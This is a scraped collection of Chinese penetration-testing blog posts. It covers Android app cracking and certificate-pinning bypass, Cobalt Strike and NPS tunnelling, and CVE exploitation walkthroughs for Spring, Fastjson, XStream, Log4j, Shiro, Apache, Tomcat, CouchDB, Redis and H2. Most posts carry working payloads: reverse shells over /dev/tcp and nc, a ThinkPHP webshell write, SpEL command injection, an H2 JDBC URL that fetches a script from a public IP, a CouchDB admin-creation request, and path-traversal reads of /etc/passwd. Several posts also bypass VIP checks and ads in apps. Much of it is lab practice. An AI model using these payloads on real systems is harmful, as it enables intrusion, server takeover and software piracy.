打开开发者模式\n123 允许USB调试\n123 使用JEB-5.9.0.202402071731_by_CXV工具 使用JDK17或者你环境\n123 反编译要调试的软件加上这串代码\nandroid:debuggable=\u0026#34;true\u0026#34; 123 拿出设置好的APP\n123 测试adb正常不\n123 使用软件自动反编译右键可以转换为JAVA代码 CTRL+B设置断点\n123 完成这个验证\n123 断点点开调试\n123 右边数据就是我们的验证\n123 123 ","date":"26 July 2025","externalUrl":null,"permalink":"/posts/anly/","section":"Posts","summary":"","title":"APP动态调试","type":"posts"},{"content":" CS怎么上线LINUX # 实现目标-上线linux # 这里我用公网当服务器开一个teamserver服务密码对应./teamserver ip 密码\n这里要用插件CrossC2-GithubBot-2023-11-20.cna\ngenCrossC2.Linux 复制到客户端 这里我用windows启动但是我生成脚本是在kali因为我公网生成报错\n很关键一部是把服务器端的.cobaltstrike.beacon_keys 文件复制到客户端然后利用插件genCrossC2.Linux生成\n123 测试没有那个.cobaltstrike.beacon_keys 文件 一直卡不出来，放上去就生成运行CS就上线了有MAC的换就行了\n123 ","date":"26 July 2025","externalUrl":null,"permalink":"/posts/cs/","section":"Posts","summary":"","title":"CS怎么上线LINUX","type":"posts"},{"content":"","date":"25 July 2025","externalUrl":null,"permalink":"/tags/app/","section":"Tags","summary":"","title":"App","type":"tags"},{"content":" APP-逆向修改 # 实现目标-修改文本的值 # 这里使用NP管理器可以直接逆向修改自动编译非常方便或者MT管理都可以，可以使用jadx-gui 查看原始JAVA代码，这里代码是smali代码\ntest 修改下面的文字\ntest 直接右上角搜索发现文本修改\ntest 修改保存退出\ntest 重新自动安装发现变了\ntest 下面那个文字不知道怎么搜就用这个开发者助手点击分析\ntest 直接复制搜索然后一套流程\ntest 修改保存重新安装\ntest 如下\ntest 修改图片类似但是怎么搜索可以到assets目录或者res目录里面有静态图片资源然后覆盖就行\ntest test 关于修改逻辑这里把逻辑代码直接改为smali语法的ip-nez与原本的等于改为不等于\n或者你修改VIP本身的函数把0x0修改为0x1绕过验证\ntest test 绕过广告可以使用这个算法助手加上LSPosed直接选择修改\ntest 进去三秒没有弹广告\ntest 有的APP绕过广告\n去掉取反 一直为真则跳过\ntest ","date":"25 July 2025","externalUrl":null,"permalink":"/posts/apptest3/","section":"Posts","summary":"","title":"APP-逆向修改","type":"posts"},{"content":" APP-安卓9模拟器抓包设置-绕过双向验证-自动扫描工具推荐 # 实现系统证书安装 # 我们先看看用户证书怎么装的\n使用模拟器-逍遥安卓9版本 这版本用户模式不能抓包了必须系统证书才可以\radb工具platform-tools_r34.0.4-windows\r使用 frida frida-server-17.2.12-android-x86_64 必须对应本地和模拟器一致 BP开启端口8888\ntest pip list 检查版本下载对应的frida上传到模拟器\radb.exe push frida-server-17.2.12-android-x86_64 /data/local test 上传后给 chmod +x frixx 执行\r本机frida-ps -U 看看能否接收 test 模拟器关闭所有\rfrida -U -f ddns.android.vuls -l SSLUnpinning.js 执行脚本\r发现可以执行 并且成功抓包绕过证书验证 test 某tantanAPP和wzyd这样绕过 和那个面具+模块差不多的 这个更直接简单FRIDA更直观\n资产收集工具：\napkleaks 好东西啊 扫描URL 端口 链接 $ pip3 install apkleaks 安装\npip3 install apkleaks 自动提取 test mobsf\nAppMessenger\n","date":"22 July 2025","externalUrl":null,"permalink":"/posts/apptest2/","section":"Posts","summary":"","title":"APP-安卓9模拟器抓包设置-绕过双向验证","type":"posts"},{"content":" APP-安卓9模拟器抓包设置-安装系统BP证书 # 实现系统证书安装 # 我们先看看用户证书怎么装的\n使用模拟器-逍遥安卓9版本 这版本用户模式不能抓包了必须系统证书才可以\radb工具platform-tools_r34.0.4-windows BP开启端口8888\ntest 模拟器登录网站下载证书命名为cer\ntest 安装取名字\ntest 这里我们在设置-\u0026gt;信任用户证书查看安装成功 - 用户证书\ntest 安装系统证书 # 设置独立系统盘-\u0026gt;在引擎里面开启Root模式\ntest windows没有openssl就用linux kali自带的 下载后输入命令就行 另存为.pem保存文件为9a5ba575.0\rOpenSSL 是一个开源的软件库，提供了安全套接字层（SSL）和传输层安全性（TLS）协议的实现，以及各种密码学算法，被广泛用于互联网上的安全通信\ropenssl x509 -inform DER -in cacert.der -out cacert.pem 将证书从 DER 二进制格式 转换为 PEM 文本格式。\ropenssl x509 -inform PEM -subject_hash_old -in cacert.pem 计算 PEM 格式证书的 旧版主题哈希值（Subject Hash），并输出该哈希值。 test 放到工具里adb打开\radb.exe root\radb.exe devices\radb.exe push 9a5ba575.0 /sdcard/ adb.exe shell\rmount -o rw,remount / 修改权限 mount作用把/dev挂载到盘里因为dev不提供文件浏览必须先挂载\rmount -o rw,remount /system\rchmod 777 /system\rmount -o remount -o rw /\rcp /sdcard/9a5ba575.0 /system/etc/security/cacerts/\rchmod 644 /system/etc/security/cacerts/9a5ba575.0\rreboot test 安装成功\ntest 抓包测试 # 有的配置了就可以抓包\n有的做了限制你还是抓不到\n设置走代理\ntest 测试成功但是做了SSL证书限制的你还是抓不到\ntest 有的设置了反代理-反模拟器-证书校验\n反代理-他验证可能检测的是你设置开了没有代理-你用APP代理就行不打开代理设置\n工具 ProxyPin-android-缺点不能转到BURP只能看抓包不能修改\n工具 Postern-3.1.2 转发BURP抓包\n绕过反代理 # test test 成功抓包绕过反代理\ntest 或者把模拟器走proxifier转发 把模拟器.exe走burp的127.0.0.1:8888端口转发到BP绕过模拟器因为真机比模拟器高一个等级\n如果都不行 反编译删除检测代码\n反证书：\nMagisk+LSPosed 两个组合绕过模块 通过共享上传LSPosed ZIP文件\ntest 然后删除/system/xbin/su这个文件防止面具报错\t用文件管理器打开超级管理员\n删除不掉没关系打开不提示就行\ntest 设置一下\ntest 重启后在wifi那里启动代理\ntest 成功抓包不会崩溃-如果模块没有装备的话进去直接会网络崩溃-记得用wifi代理\ntest ","date":"21 July 2025","externalUrl":null,"permalink":"/posts/apptest/","section":"Posts","summary":"","title":"APP-安卓9模拟器抓包设置-安装系统BP证书","type":"posts"},{"content":"","date":"20 July 2025","externalUrl":null,"permalink":"/tags/nps/","section":"Tags","summary":"","title":"Nps","type":"tags"},{"content":" NPS-内网攻防信息打点工具 # 实现目标-通过本机访问别人的localhost3306数据库 # test 本地启动nps服务端 默认打开8080端口web服务 账号admin密码123 可以在conf里面修改密码\ntest 登录后创建一个客户端复制连接口令\ntest 把下面命令复制给客户端的一台跳板主机\ntest test 运行刷新连接变成了就绪我们点击隧道创建一个本地的6666就是对应对方IP的3306 对应数据库服务\ntest 访问查看发现可以直接连接\ntest 后续使用Socket建立一个节点也可以\n实现目标通过socks建立节点打通内网 # 先安装代理工具linux\n# Debian/Ubuntu sudo apt-get install proxychains # CentOS/RHEL sudo yum install proxychains-ng 如果是windows 用proxfier 这里nps用的socks5 使用 # 注释掉原有示例，添加你的代理 /etc/proxychains.conf 文件 设置 socks5 127.0.0.1 1080 # SOCKS5 代理 # http 127.0.0.1 8080 # HTTP 代理（根据需要选择） 设置通过socks本身9999端口\ntest NPS设置界面为9999和本地吻合\ntest 使用proxychains4 curl xx 代理来运行 不要直接运行\r可以看到成功访问我们的内网 上面是没用的访问不到 test nps改默认密码\n修改 nps.conf 文件把默认密码123修改即可\n实现通过VSHELL平台设置端口映射 # 基于端口转发技术挂载在公网\n实现隐藏真实IP只有转发服务器IP test 把8084转发到内网的8084干到了公网上\ntest test ","date":"20 July 2025","externalUrl":null,"permalink":"/posts/nps/","section":"Posts","summary":"","title":"NPS-内网攻防信息打点工具","type":"posts"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/activemq/","section":"Tags","summary":"","title":"ActiveMQ","type":"tags"},{"content":" 处理平台安全-ActiveMQ-RocketMQ-Kafka-CVE # ActiveMQ # 界面如下，通常通过端口 8161 web 61616 tcp远程访问 来判断或者通过功能点来判断\ntest CVE-2022-41678 # 在5.16.5, 5.17.3版本及以前 python poc.py -u admin -p admin http://xx:8161/\ntest 2、CVE-2023-46604 # python3 -m http.server 6666 python3 poc.py 目标IP 目标端口 http://IP:6666/poc.xml python \u0026ldquo;poc (1).py\u0026rdquo; 192.168.79.136 61616 http://xx:8000/poc.xml\n通过建立网络\ntest POC具体内容\ntest RocketMQ # 9876 NameServer通信端口用于客户端路由请求和Broker注册发现 10911 Broker主监听端口处理消息发送/消费等核心服务\n搭建很麻烦遇到直接测试\n探测：d:\\Python3.8\\python.exe check.py \u0026ndash;ip ip \u0026ndash;port 9876\nCVE-2023-33246 CVE-2023-37582\nPOC java -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackBroker \u0026ndash;target ip:10911 \u0026ndash;cmd \u0026ldquo;xxxx\u0026rdquo;\nPOC python.exe CVE-2023-37582.py -ip ip -p 9876\nKafka # 分布式流处理平台，用于高吞吐量实时数据传输存储和处理， 广泛应用于日志收集、消息队列、数据管道、实时分析等场景。\nCVE-2023-25194 漏洞影响版本：2.3.0 \u0026lt;= Apache Kafka \u0026lt;= 3.3.2 https://github.com/vulhub/vulhub/blob/master/kafka/CVE-2023-25194/README.zh-cn.md 需要JNDI 字节码搭建攻击\ntest ","date":"18 July 2025","externalUrl":null,"permalink":"/posts/active/","section":"Posts","summary":"","title":"ActiveMQ-RocketMQ-Kafka-CVE","type":"posts"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/kafka/","section":"Tags","summary":"","title":"Kafka","type":"tags"},{"content":"","date":"18 July 2025","externalUrl":null,"permalink":"/tags/rocketmq/","section":"Tags","summary":"","title":"RocketMQ","type":"tags"},{"content":"","date":"17 July 2025","externalUrl":null,"permalink":"/tags/springboot/","section":"Tags","summary":"","title":"SpringBoot","type":"tags"},{"content":"","date":"17 July 2025","externalUrl":null,"permalink":"/tags/struct2/","section":"Tags","summary":"","title":"Struct2","type":"tags"},{"content":"","date":"17 July 2025","externalUrl":null,"permalink":"/tags/thinkphp/","section":"Tags","summary":"","title":"THINKPHP","type":"tags"},{"content":" THINKPHP-laravel-SpringBoot-Gateway-Struct2 CVE # thinkphp # thinkphp\n在其6.0.13版本及以前\n/?+config-create+/\u0026amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd\u0026amp;/\u0026lt;?=phpinfo()?\u0026gt;+shell.php\r写入文件 test 版本5.X命令执行 工具梭哈\ntest test Laravel # CVE-2021-3129 RCE 工具 # exp python\nstruct2框架 16年很多现在很少了 # 特点 index.action 这个action 工具梭哈因为漏洞很多\ntest SpringBoot # CVE-2022-22965 # Spring core是Spring系列产品中用来负责发现、创建并处理bean之间的关系的一个工具包，是一个包含Spring框架基本的核心工具包，Spring其他组件都要使用到这个包。\nCVE-2022-22965_Spring_Core_RCE-main\u0026gt; exp.py\ntest CVE-2021-21234 目录遍历 # Spring-boot-actuator-logview 0.2.13之前版本存在路径遍历漏洞，攻击者可通过该缺陷读取系统任意文件。 需要有这个组件才可以 而且要满足版本 不然不行\ntest CVE-2022-22947 # API网关Spring Cloud Gateway是Spring中的一个API网关。 Spring Cloud Gateway 3.1.x \u0026lt; 3.1.1 Spring Cloud Gateway 3.0.x \u0026lt; 3.0.7\n两种工具直接梭哈\ntest test CVE-2022-22963 Spring Cloud Function Spel表达式注入 # Spring Cloud Function提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像Amazon AWS Lambda这样的 FaaS（函数即服务，function as a service）平台。\n3.0.0.RELEASE \u0026lt;= Spring Cloud Function \u0026lt;= 3.2.2 参考：https://developer.aliyun.com/article/1160011\nPOST：/functionRouter\rspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\u0026#34;bash -c {echo,xx}|{base64,-d}|{bash,-i}\u0026#34;) test ","date":"17 July 2025","externalUrl":null,"permalink":"/posts/tp-lara-springboot/","section":"Posts","summary":"","title":"THINKPHP-laravel-SpringBoot-Gateway-Struct2 CVE","type":"posts"},{"content":" fastjson-不出网-限制 # JDK版本高 # 用jndibypass工具自动验证 JDK版本高的问题 打入payload\n使用fjparty靶场\ntest test test FASTJSON遇到WAF限制 # 输入提示hack 这个只能一个PAYLOAD一个打尝试因为不知道版本\nnc ip tcp -e sh\ntest 使用unicode编码绕过\ntest 不出网 # 判断依赖\n{\u0026#34;x\u0026#34;:{\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Character\u0026#34;{\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Class\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;com.mchange.v2.c3p0.DataSources\u0026#34;}} {\r\u0026#34;@type\u0026#34;: \u0026#34;java.lang.AutoCloseable\u0026#34;\r} test test 注入原生fastjson 1.2.47代码执行命令\ntest 或者反弹shell\n这里注意对面是有WAF的\n但还可以使用添加_或+处理关键字绕过，可参考\nhttps://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/)\n这里使用\\u unicode不行换这个成功执行\ntest 这里因为是不出网络所以按道理反弹SHELL是不行的 我这里是因为环境问题 你可以写入一个内存马写入后门达到获取SHELL\n更好的是使用SLEEP来判断是否执行了命令\n打入哥斯拉内存马\ntest 使用/*内存马任意访问\ntest POST /login HTTP/1.1\rHost: IP\rContent-Length: 24035\rX-Requested-With: XMLHttpRequest\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\rAccept: */*\rContent-Type: application/json; charset=UTF-8\rAccept-Encoding: gzip, deflate, br\rAccept-Language: en-US,en;q=0.9\rConnection: keep-alive\r{\r\u0026#34;a\u0026#34;:{\r\u0026#34;@type\u0026#34;:\u0026#34;java.lang.Class\u0026#34;,\r\u0026#34;val\u0026#34;:\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\u0026#34;\r},\r\u0026#34;b\u0026#34;:{\r\u0026#34;@type\u0026#34;:\u0026#34;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\u0026#34;,\r\u0026#34;us_erOverridesAsString\u0026#34;:\u0026#34;HexAsciiSerializedMap:;\u0026#34;,\r}\r} ","date":"16 July 2025","externalUrl":null,"permalink":"/posts/fastjson/","section":"Posts","summary":"","title":"Fastjson","type":"posts"},{"content":"","date":"16 July 2025","externalUrl":null,"permalink":"/tags/fastjson/","section":"Tags","summary":"","title":"Fastjson","type":"tags"},{"content":" CVE-java-jackson-xstream-fastjson # jackson # jackson CVE-2020-8840 # JNDI\ntest CVE-2020-35728 # JNDI\ntest Xstream # Xstream 开源Java类库，能将对象序列化成XML或XML反序列化为对象\n代码执行 (CVE-2021-21351） # Xstream\u0026lt;=1.4.15\nvulhub/xstream/CVE-2021-21351/README.zh-cn.md at master · vulhub/vulhub · GitHub\n直接改变类型为xml\ntest 放入JNDI注入代码\ntest 反弹成功\ntest CVE-2021-29505 # vulhub/xstream/CVE-2021-29505/README.zh-cn.md at master · vulhub/vulhub · GitHub\nXStream \u0026lt;= 1.4.16\n你可以先测试下解析XML不 要看对方的代码逻辑\n是看具体标签对不对还是格式对就行\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;user\u0026gt; \u0026lt;name\u0026gt;Bob\u0026lt;/name\u0026gt; \u0026lt;age\u0026gt;22\u0026lt;/age\u0026gt; \u0026lt;/user\u0026gt;\ruser是标签 里面是他的子标签 java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1089 CommonsCollections6 \u0026ldquo;bash -c {echo,base64数据反弹命令}|{base64,-d}|{bash,-i}\u0026rdquo;\nbash -i \u0026gt;\u0026amp; /dev/tcp/xx/xx 0\u0026gt;\u0026amp;1\n测试有xml数据发送\ntest 本地监听一个1089端口 里面是CC链条的反弹SHELL命令\ntest 放入POC\ntest 反弹成功\ntest 这里工具使用ysoserial-all.jar 和 ysoserial-0.0.8-SNAPSHOT-all.jar都可以\nFASTJSON # fastjson到1.2.80 已经基本把本地链条封完了 只能通过外部链接 执行\nvulhub/fastjson/1.2.24-rce/README.zh-cn.md at master · vulhub/vulhub · GitHub\n1.2.40\n这里是访问会返回JSON数据我们输入错误可以\ntest 创建成功\ntest 介绍两个推荐插件 右键发送\n直接爆出利用代码 FastjsonScan\ntest 爆出版本FastjsonScan4Burp\ntest ","date":"14 July 2025","externalUrl":null,"permalink":"/posts/cve-java-jackson-xstream-fastjson/","section":"Posts","summary":"","title":"CVE-java-jackson-xstream-fastjson","type":"posts"},{"content":"","date":"14 July 2025","externalUrl":null,"permalink":"/tags/jackson/","section":"Tags","summary":"","title":"Jackson","type":"tags"},{"content":"","date":"14 July 2025","externalUrl":null,"permalink":"/tags/xstream/","section":"Tags","summary":"","title":"Xstream","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/apache/","section":"Tags","summary":"","title":"Apache","type":"tags"},{"content":" CVE-java-solr-log4j-shiro # 主要基于HTTP和Apache Lucene实现的全文搜索服务器。\n8393端口\n历史漏洞：https://avd.aliyun.com/search?q=Solr\ntest CVE-2019-17558命令执行 # 用PY2.7来运行脚本\ntest CVE-2019-0193-命令执行 # Apache Solr \u0026lt; 8.2.0版本 条件1：Apache Solr的DataImportHandler启用了模块DataImportHandler(默认不会被启用) 条件2：Solr Admin UI未开启鉴权认证。（默认情况无需任何认证）\nPOC，点击Execute with this Confuguration\ntest CVE-2024-45216 认证绕过 # GET /solr/admin/info/properties:/admin/info/key 发包看返回\nSHIRO 看remeberme # CVE-2020-11989-绕过验证 # Poc：/admin/%20 影响范围：Apache Shiro \u0026lt; 1.7.1\nCVE-2022-32532 绕过鉴权 # Poc： /permit/any\n/permit/a%0any可绕过\nSHIRO反序列 java -jar ysoserial.jar CommonsCollections5 \u0026ldquo;calc.exe\u0026rdquo; \u0026gt; payload.ser生成 使用AES默认密钥加密 \u0026gt; base64加密\nLOG4J # CVE-2021-44228 # PAYLOAD能插入jndi的就插入进去试试\nVULNHUB靶场\n生成JNDI注入\ntest 本地监听\n在参数直接插入进去\ntest 拿到SHELL\ntest 不成功可能：\n对方没有log4j LOG4J版本高 JDK版本过高\n","date":"13 July 2025","externalUrl":null,"permalink":"/posts/cve-java-solr/","section":"Posts","summary":"","title":"CVE-java-solr-log4j-shiro","type":"posts"},{"content":" CVE-vulfocus-apache-tomcat-jetty-weblogic # ApacheSSRF-CVE-2021-40438 # 版本在其2.4.48及以前的版本中\nApache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞\n访问输入POC\nGET /?unix|http://example.com/ HTTP/1.1\rHost: 123.58.224.8:31947\rAccept-Encoding: gzip, deflate\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\rConnection: close 发现成功执行了SSRF命令 接下来就可以试试file本地读取命令了\nApache路径穿越-CVE-2021-41773 # 版本-2.4.49\n路径穿越 curl -v \u0026ndash;path-as-is http://your-ip:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd\n注意 \u0026ndash;path-as-is 高版本可以用\nApache路径穿越-CVE-2021-42013 # \u0026ldquo;Apache/2.4.50\u0026rdquo;\n注意curl版本 windows不行试试linux的\n绕过前面41337的补丁\n版本2.4.50\n我们抓包可以看见版本\nPOC读取文件\ncurl -v --path-as-is http://123.58.224.8:44467/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd 在服务端开启了cgi或cgid这两个mod的情况下，这个路径穿越漏洞将可以执行任意命令：\n命令执行 # curl -v \u0026ndash;data \u0026ldquo;echo;id\u0026rdquo; \u0026lsquo;http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh\u0026rsquo;\n额fofo试了下没什么用\nTOMCAT # TOMCAT终端登录密码 在配置文件中默认tomcat tomcat\ntomcat-users.xml\n弱口令 # 存在面板\n上传WAR包后访问后门\n生成后门后成功压缩文件改zip格式为war即可\n成功getshell\nCVE-2020-1938 AJP文件包含漏洞 # 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。\nTomcat 6.*\nTomcat 7.* \u0026lt; 7.0.100\nTomcat 8.* \u0026lt; 8.5.51\nTomcat 9.* \u0026lt; 9.0.31\n这个脚本用PY2.7使用\nTOMCAT RCE CVE-2025-24813 # https://www.cnblogs.com/smileleooo/p/18772389 需要满足条件\njetty # 一个开源的servlet容器，它为基于Java的Web容器提供运行环境。\nCVE-2021-28169 对于\u0026lt;= 9.4.40、\u0026lt;= 10.0.2、\u0026lt;= 11.0.2的Eclipse Jetty版本，\ncurl -v http://123.58.224.8:16187/static?/%2557EB-INF/web.xml 为什么不在url直接用因为浏览器会自动解码加载必须curl\nF12可以发现是jetty\nCVE-2021-34429对于9.4.37-9.4.42、10.0.1-10.0.5和11.0.1-11.0.5的Eclipse /%u002e/WEB-INF/web.xml\nweblogic # CVE很多直接工具梭哈\nweblogicTool\n# ","date":"13 July 2025","externalUrl":null,"permalink":"/posts/cve-apache-jetty-tomcat/","section":"Posts","summary":"","title":"CVE-vulfocus-apache-tomcat-jetty-weblogic","type":"posts"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/jetty/","section":"Tags","summary":"","title":"Jetty","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/log4j/","section":"Tags","summary":"","title":"Log4j","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/shiro/","section":"Tags","summary":"","title":"Shiro","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/solr/","section":"Tags","summary":"","title":"Solr","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/tomcat/","section":"Tags","summary":"","title":"Tomcat","type":"tags"},{"content":"","date":"13 July 2025","externalUrl":null,"permalink":"/tags/vulhub/","section":"Tags","summary":"","title":"Vulhub","type":"tags"},{"content":"","date":"12 July 2025","externalUrl":null,"permalink":"/tags/couchdb/","section":"Tags","summary":"","title":"Couchdb","type":"tags"},{"content":" CVE-vulfocus-vulhub-redis-couchdb-H2DB # redis- 高性能内存数据库 # 关于redis 我们直接在vulfocus上面拉镜像并使用脚本文件redis-rogue-server-master即可通杀\n高速缓存 作为数据库前端缓存，减少数据库访问压力。 案例：电商首页热门商品缓存、新闻网站热门文章缓存。 实时数据处理 支持高并发读写（单节点 QPS 可达 10 万 +），适合实时统计场景。 案例：直播间在线人数统计、秒杀活动库存扣减。 一般来说redis的CVE就是配置不当 bind 127.0.0.1 是默认开启的 然后requirepass默认为空意思就是本地随便进去\r但是你如果不想本地但是又忘记修改密码就会造成问题 CNCD-2015-07557打开靶场设置脚本的目的为靶机IP 端口他把默认端口6379映射为36700 直接运行选择r反弹shell\n我们对端监听就可以发现直接反弹成功拿下了服务器\r用户是redis表示他使用redis来当用户 这里redis的CVE CNVD都能用这个脚本来运行测试 原理就是未授权加上模块的恶意执行\n一般个人测是三方面\n写入web后门 要求-对方有web服务器 ssh密钥登录 要求-root权限 密钥登录允许 写入计时任务 要求-root权限 系统限制 如centos可以 ubantu可能有字符错误 CouchDB-cve_2017_12636-面向文档、强调分布式一致性 # CouchDB 内置多主复制和冲突检测机制，适合移动应用、协作工具（如笔记应用）等需要离线工作的场景。 案例：医疗记录系统（医生在无网络环境下访问 / 修改数据，恢复网络后自动同步）。\n文档型数据管理 适合存储结构化程度较低的数据（如博客文章、产品目录），无需预定义表结构。 案例：内容管理系统（CMS）存储文章、评论等。\n高可用分布式系统 通过多节点复制实现自动故障转移，适合地理分布的应用。 案例：跨国公司的分布式办公系统。\n历史数据追踪 支持文档版本控制（MVCC），适合需要审计日志的场景。 案例：金融交易记录系统。\n修改反弹ip端口\n使用PY脚本运行这里\nCVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。\nCouchDB-CVE-2022-24706 # 在vulhub使用docker-compose up -d 启动端口 它默认启动了4369和 本身端口 5984\n5984: Apache CouchDB Web管理接口 4369: Erlang端口映射服务（epmd） 9100: 集群节点通信和运行时自省服务（代码执行实际发生在这个端口中） 这里利用的就是这个分布式端口4369\n这个POC会先通过目标的4369端口epmd服务获取集群通信的端口，也就是9100，然后再使用默认Cookie来控制节点执行任意命令。 couchdb-cve_2017_12635 # 上面那个CVE就是基于这个漏洞进行任意注册直接查看数据库信息\n访问Get:/_utils/ 需要登录用漏洞cve_2017_12635\nPOC 添加用户user 是admin组的\nPUT /_users/org.couchdb.user:用户 HTTP/1.1\rHost: XX:XX\rAccept: */*\rAccept-Language: en\rUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\rConnection: close\rContent-Type: application/json\rContent-Length: 108\r{\r\u0026#34;type\u0026#34;: \u0026#34;user\u0026#34;,\r\u0026#34;name\u0026#34;: \u0026#34;用户\u0026#34;,\r\u0026#34;roles\u0026#34;: [\u0026#34;_admin\u0026#34;],\r\u0026#34;roles\u0026#34;: [],\r\u0026#34;password\u0026#34;: \u0026#34;密码\u0026#34;\r} 再访问可以查看数据库了\nH2database -CVE-2022-23221 # Java SQL 数据库 H2,H2的主要特点是：非常快，开源，JDBC API；嵌入式和服务器模式；内存数据库；基于浏览器的控制台应用程序。H2 数据库控制台中的另一个未经身份验证的 RCE 漏洞，在v2.1.210+中修复。2.1.210 之前的H2控制台允许远程攻击者通过包含子字符串的jdbc:h2:mem JDBC URL执行任意代码。\n输入后直接进入读取文件了\n拿到SHELL步骤\n进入后在你公网主机创建数据库文件并且监听打开python服务\nCREATE TABLE test (\rid INT NOT NULL\r);\rCREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST AS \u0026#39;//javascript\rJava.type(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;bash -c {echo,反弹的base64输入}|{base64,-d}|{bash,-i}\u0026#34;);\u0026#39;;\rbash -i \u0026gt;\u0026amp; /dev/tcp/x.x.x.x/5566 0\u0026gt;\u0026amp;1 创建sql文件能访问后退出首页再次输入\njdbc:h2:mem:test1;FORBID_CREATION=FALSE;IGNORE_UNKNOWN_SETTINGS=TRUE;FORBID_CREATION=FALSE;INIT=RUNSCRIPT FROM \u0026#39;http://116.62.32.64:8000/123.sql\u0026#39;;\\ NC监听对应sql文件的端口得到SHELL\n总结 # 他们数据库和mysql关系性的区别\nMySQL 是 “系统的核心账本”，适合存储结构化、需要强事务保证的核心业务数据（如订单、支付记录）； CouchDB 是 “灵活的文档仓库”，适合存储结构多变、需要分布式同步的文档数据（如博客文章、离线应用数据）； Redis 是 “高速数据中转站”，核心价值之一是作为缓存，通过内存存储高频数据，解决数据库性能瓶颈。 三者并非替代关系，实际业务中常结合使用（例如：MySQL 存订单，Redis 缓存订单列表，CouchDB 存用户生成的动态内容）。 redis缓存：\n而 Redis 基于内存存储，读写速度极快，且支持复杂数据结构，非常适合作为 “中间层缓存”，让高频数据直接从 Redis 读取，而非每次都访问数据库。\n","date":"12 July 2025","externalUrl":null,"permalink":"/posts/cve-vulfocus-vulhub-redis-couchdb-h2db/","section":"Posts","summary":"","title":"CVE-vulfocus-vulhub-redis-couchdb-H2DB","type":"posts"},{"content":"","date":"12 July 2025","externalUrl":null,"permalink":"/tags/redis/","section":"Tags","summary":"","title":"Redis","type":"tags"},{"content":"","date":"12 July 2025","externalUrl":null,"permalink":"/tags/sudoers/","section":"Tags","summary":"","title":"Sudoers","type":"tags"},{"content":" sudo靶机\u0026mdash;难度easy知识点-爆破-sudoers # Nmap扫描发现常规端口 80和22 # 访问80看看 这里我直接爆破了-这里劫持到后发送到repeter这里的token感觉没什么用的感觉\n爆破密码是admin@123 这里爆破后你回来返回会发现自动跳转了 我后面测试这个token不管就行你repeter输入完也是自动跳转两个token不一样都行 进去后上传文件- 执行获得shell 这里密码其实在readme.md里面了我没看到.\n拿到shell权限 # 上传linpeas扫描发现suid文件\n读取shadow试试\njohn一下\n拿root # 进入eecho用户后发现没有sudo -l\n只有这个读取文件利用读取下 sudoers\r这里发现了可以有一个但是要主机名是dashazi我们就以主机名是dashazi来运行就行 不会命令就AI 反弹SHELL 总结一下 # 1：配置文件多看看\n","date":"12 July 2025","externalUrl":null,"permalink":"/posts/sudo/","section":"Posts","summary":"","title":"sudo靶机---难度low知识点-爆破-sudoers","type":"posts"},{"content":"","date":"12 July 2025","externalUrl":null,"permalink":"/tags/vulfocus/","section":"Tags","summary":"","title":"Vulfocus","type":"tags"},{"content":"","date":"12 July 2025","externalUrl":null,"permalink":"/tags/%E7%88%86%E7%A0%B4/","section":"Tags","summary":"","title":"爆破","type":"tags"},{"content":"","date":"11 July 2025","externalUrl":null,"permalink":"/tags/portswigger/","section":"Tags","summary":"","title":"Portswigger","type":"tags"},{"content":"","date":"11 July 2025","externalUrl":null,"permalink":"/tags/websocket/","section":"Tags","summary":"","title":"Websocket","type":"tags"},{"content":" bp靶场\u0026mdash;websocket-messages to exploit vulnerabilities # WebSocket 是一种在**单个 TCP 连接上进行全双工通信**的协议，允许客户端（如浏览器）和服务器之间实时交换数据，无需频繁的 HTTP 请求。它彻底改变了 Web 应用的实时性体验，广泛应用于聊天、实时数据监控、在线游戏等场景。是一个应用层协议 协议开头ws(http)或者wss(https) BP介绍 # BURP是可以抓取websocket数据的 可以发现我们输入什么我们发送服务器 服务器发送数据回来进行实时交互 F12也可以看数据发送 实验 # 这里要求我们注入xss 